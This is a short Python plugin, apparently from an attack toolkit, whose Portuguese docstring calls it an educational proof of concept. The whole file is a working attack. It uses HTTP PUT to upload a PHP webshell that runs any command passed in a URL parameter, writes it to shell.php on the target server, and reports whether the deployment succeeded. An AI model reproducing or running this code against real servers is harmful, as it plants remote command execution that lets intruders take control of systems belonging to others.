# plugins/fast_webshell_deployer.py
def run(target, results):
    """
    Tenta fazer upload de uma webshell PHP via HTTP PUT (apenas PoC, uso educacional!).
    Retorna URL caso sucesso, ou erro.
    """
    import requests

    try:
        payload = "<?php system($_GET['cmd']); ?>"
        url = f"http://{target}/shell.php"
        r = requests.put(url, data=payload, timeout=6)
        if r.status_code in [200, 201, 204]:
            results["fast_webshell_deployer"] = f"Webshell enviada: {url}"
        else:
            results["fast_webshell_deployer"] = f"Falha no deploy ({r.status_code})"
    except Exception as e:
        results["fast_webshell_deployer"] = {"error": str(e)}
